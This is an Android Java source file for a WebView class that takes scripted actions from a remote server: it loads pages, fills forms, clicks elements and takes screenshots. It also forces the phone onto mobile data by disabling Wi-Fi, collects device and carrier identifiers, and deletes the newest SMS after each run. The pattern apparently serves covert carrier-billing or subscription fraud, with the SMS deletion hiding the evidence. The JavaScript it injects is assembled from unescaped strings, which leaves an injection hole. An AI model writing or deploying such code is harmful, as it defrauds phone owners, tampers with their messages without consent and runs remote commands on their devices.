package automation.bml.com.webviewautomation;

import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Picture;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.text.format.Formatter;
import android.util.AttributeSet;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import java.io.File;
import java.io.FileOutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import automation.bml.com.webviewautomation.RestAPI.Constants;
import automation.bml.com.webviewautomation.RestAPI.DataModel.Action;
import automation.bml.com.webviewautomation.RestAPI.DataModel.Settings;
import automation.bml.com.webviewautomation.RestAPI.DataModel.TransactionResponse;
import automation.bml.com.webviewautomation.RestAPI.RestAPI;
import okhttp3.OkHttpClient;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

import static android.content.Context.ACTIVITY_SERVICE;
import static android.content.Context.CONNECTIVITY_SERVICE;
import static android.content.Context.WIFI_SERVICE;

public class AutomatedWebview extends WebView {

    Settings settings; //Storing setting value from API call
    RestAPI service;
    Context context;
    private int mnc, mcc;
    private String cssSelector;
    ArrayList<Action> actionList;
    public AutomatedWebview(Context context) {
        super(context);
        this.context = context;
        init();
    }

    public AutomatedWebview(Context context, AttributeSet attributes) {
        super(context, attributes);
        this.context = context;
        init();
    }

    public void init() {

        //Setting up REST api objects
        OkHttpClient httpClient = new OkHttpClient.Builder().build();
        Gson gson = new GsonBuilder()
                .setLenient()
                .create();
        Retrofit retrofit = new Retrofit.Builder().addConverterFactory(GsonConverterFactory.create(gson)).baseUrl(RestAPI.BASE_URL).client(httpClient).build();
        service = retrofit.create(RestAPI.class);

        //Displaying device info
        Toast.makeText(context, "Manufacturer: " + getDeviceManufacturer(), Toast.LENGTH_SHORT).show();
        Toast.makeText(context, "Model: " + getModel(), Toast.LENGTH_SHORT).show();

        setUUID(); // Setting the UUID on installation

        //Webview settings
        getSettings().setJavaScriptEnabled(true);
        setWebChromeClient(new WebChromeClient());
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            setWebViewClient(new WebViewClient() {
                @Override
                public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                    view.loadUrl(request.getUrl().toString());
                    return true;
                }
            });
        } else {
           setWebViewClient(new WebViewClient() {
                @Override
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                    view.loadUrl(url);
                    return true;
                }
            });
        }

        //Checking connection type
        ConnectivityManager connManager = (ConnectivityManager) context.getSystemService(CONNECTIVITY_SERVICE);
        NetworkInfo mMobile = connManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);

        if (mMobile == null) //No 3g/4g connection
        {
            changeWifiStatus(false);
            mMobile = connManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            if (mMobile == null) {
                try {
                    changeWifiStatus(true);
                }
                catch(Exception e)
                {
                    e.printStackTrace();
                }
            }
        }
        if (mMobile != null) //If connected to 3G/4G
        {
            getMNCMCC(); //generating mnc & mcc
            if (mnc != 0 || mcc != 0) //If MNC and MCC are not empty
            {
                //Calling the api
                try {
                    Call<TransactionResponse> meResponse = service.loadData("1", getUUID(), getUserAgent(), getIPAddress(), "20408", "start");
                    meResponse.enqueue(new Callback<TransactionResponse>() {
                        @Override
                        public void onResponse(Call<TransactionResponse> call, Response<TransactionResponse> response) {
                            if (response.isSuccessful()) {
                                TransactionResponse body = response.body();
                                Map<String, String> actions = body.getActions();
                                settings = body.getSettings();
                                actionList = new ArrayList<>();
                                for (Map.Entry<String, String> entry : actions.entrySet()) {
                                    actionList.add(actionParser(entry));
                                }

                                if (isForeground()) // if App is active
                                    process();
                                else
                                    updateData("WAITING"); //Update server status

                            } else {
                                updateData("NO VALID JSON RECEIVED");
                                Toast.makeText(context, "Loading data failed, please try again!", Toast.LENGTH_LONG).show();
                            }
                        }

                        @Override
                        public void onFailure(Call<TransactionResponse> call, Throwable t) {
                            Toast.makeText(context, "Network error, please try again!", Toast.LENGTH_LONG).show();
                            t.printStackTrace();
                        }
                    });
                } catch (Exception e) {
                    e.printStackTrace();
                }
            } else {
                updateData("MCCMNC is empty");
            }
        }
    }

    // Javascript injection for automated actions

    public void focus(String selector) {
        String script = "document.querySelector('" + selector + "').focus();";
        cssSelector = selector;
        injectJS(script);
    }

    public void enter(String text) {
        String script = "(function() {document.querySelector('" + cssSelector + "').value= '" + text + "';}) ();";
        injectJS(script);
    }

    public void click(String selector) {
        String script = "(function() {document.querySelector('" + selector + "').click();})();";
        injectJS(script);
    }

    public void takeScreenshot() {
        String fileName = generateFileName(this.getUrl());
        Picture picture = capturePicture();
        Bitmap b = Bitmap.createBitmap(picture.getWidth(),
                picture.getHeight(), Bitmap.Config.ARGB_8888);
        Canvas c = new Canvas(b);
        picture.draw(c);
        FileOutputStream fos;
        try {
            if (createDirIfNotExists(Constants.DIRECTORY)) {
                File file = new File(context.getExternalFilesDir(Environment.DIRECTORY_PICTURES) + "/" + Constants.DIRECTORY + "/" + fileName);
                fos = new FileOutputStream(file);
                if (fos != null) {
                    b.compress(Bitmap.CompressFormat.JPEG, 100, fos);
                    Toast.makeText(context, "Saved screenshot!", Toast.LENGTH_LONG).show();
                    fos.close();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void process() {
        int seconds = 0;
        Handler handler = new Handler();
        int count = 0;
        for (final Action item : actionList) {
            if (item.getAction().equalsIgnoreCase("load")) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        loadUrl(item.getParameter());
                    }
                }, seconds * 1000);
            } else if (item.getAction().equalsIgnoreCase("wait")) {
                try {
                    seconds += Integer.parseInt(item.getParameter());
                } catch (Exception e) {
                    e.printStackTrace();
                }

            } else if (item.getAction().equalsIgnoreCase("focus")) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        focus(item.getParameter());
                    }
                }, seconds * 1000);

            } else if (item.getAction().equalsIgnoreCase("enter")) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        enter(item.getParameter());
                    }
                }, seconds * 1000);
            } else if (item.getAction().equalsIgnoreCase("click")) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        click(item.getParameter());
                    }
                }, seconds * 1000);
            } else if (item.getAction().equalsIgnoreCase("screenshot")) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        takeScreenshot();
                    }
                }, seconds * 1000);
            }
            count++;
        }

        //Removing last sms
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                removeSMS();
            }
        }, seconds * 1000+100);

        //Updating server
        final int finalCount = count;
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if(finalCount == actionList.size())
                    updateData("SUCCESS");
            }
        }, seconds * 1000+200);
    }

    //Processing functions

    public void changeWifiStatus(boolean status) {
        WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        if(status)
        {
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION) ;
            intentFilter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
            WifiReceiver receiver =  new WifiReceiver(this,true);
            context.registerReceiver(receiver, intentFilter);
        }
        wifiManager.setWifiEnabled(status);
    }

    private void getMNCMCC() {
        TelephonyManager tel = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String networkOperator = tel.getNetworkOperator();

        if (!TextUtils.isEmpty(networkOperator)) {
            mcc = Integer.parseInt(networkOperator.substring(0, 3));
            mnc = Integer.parseInt(networkOperator.substring(3));
        }
    }

    public String getUserAgent() {
        return this.getSettings().getUserAgentString();
    }

    public String getIPAddress() {
        WifiManager wm = (WifiManager) context.getSystemService(WIFI_SERVICE);
        String ip = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
        return ip;
    }

    public void setUUID() {
        SharedPreferences sharedPreferences = context.getSharedPreferences(Constants.sharedPreferenceName, Context.MODE_PRIVATE);
        if (getUUID().isEmpty()) {
            String newId = UUID.randomUUID().toString();
            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putString("uuid", newId);
            editor.commit();
        }
    }

    public String getUUID() {
        SharedPreferences sharedPreferences = context.getSharedPreferences(Constants.sharedPreferenceName, Context.MODE_PRIVATE);
        String uuid = sharedPreferences.getString("uuid", "");
        return uuid;
    }

    public void updateData(final String status) {
        String transaction_id = "";
        if(settings != null)
            transaction_id = settings.getTransactionId();
        Call<String> meResponse = service.updateData("update", transaction_id, status);
        meResponse.enqueue(new Callback<String>() {
            @Override
            public void onResponse(Call<String> call, Response<String> response) {
                if (response.isSuccessful() && response.body().equalsIgnoreCase("ok")) {
                    Toast.makeText(context, "Updated server: " + status, Toast.LENGTH_LONG).show();
                } else {
                    Toast.makeText(context, "Updating data failed, please try again!", Toast.LENGTH_LONG).show();
                }
            }

            @Override
            public void onFailure(Call<String> call, Throwable t) {
                Toast.makeText(context, "Network error, please try again!", Toast.LENGTH_LONG).show();
                t.printStackTrace();
            }
        });
    }

    public String getDeviceManufacturer() {
        return android.os.Build.MANUFACTURER;
    }

    public String getModel() {
        return android.os.Build.MODEL;
    }

    // miscellaneous functions
    private void injectJS(String script) {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append(script);
            loadUrl("javascript:" + script);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private boolean createDirIfNotExists(String path) {
        boolean ret = true;
        File file = new File(context.getExternalFilesDir(Environment.DIRECTORY_PICTURES), path);
        if (!file.exists()) {
            if (!file.mkdirs()) {
                ret = false;
            }
        }
        return ret;
    }

    private String generateFileName(String url) {
        String name = "screenshot.jpg";
        URL u;
        try {
            u = new URL(url);
            name = u.getHost()+".jpg";
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        return name;
    }

    private void removeSMS() {
        Uri uriSMSURI = Uri.parse("content://sms/");
        try {
            Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
            if (cur.moveToFirst()) {
                String MsgId = cur.getString(0);
                context.getContentResolver().delete(Uri.parse("content://sms/" + MsgId), null, null);
            }
        }
        catch(Exception e)
        {
            e.printStackTrace();
        }
    }

    public boolean isForeground() {
        String PackageName = context.getPackageName();
        ActivityManager manager = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);
        List<ActivityManager.RunningTaskInfo> task = manager.getRunningTasks(1);
        ComponentName componentInfo = task.get(0).topActivity;
        if (componentInfo.getPackageName().equals(PackageName))
            return true;
        return false;
    }

    private Action actionParser(Map.Entry<String, String> entry) // Getting action and parameter from data
    {
        String action = "";
        String parameter = "";
        if (entry.getValue().length() > 0) {
            String array[] = entry.getValue().split(" ", 2);
            action = array[0];
            if (array.length > 1) {
                parameter = array[1];
                parameter = parameter.replace("\\", ""); // removing brackets CSS validation
            }
        }
        return new Action(action, parameter);
    }
}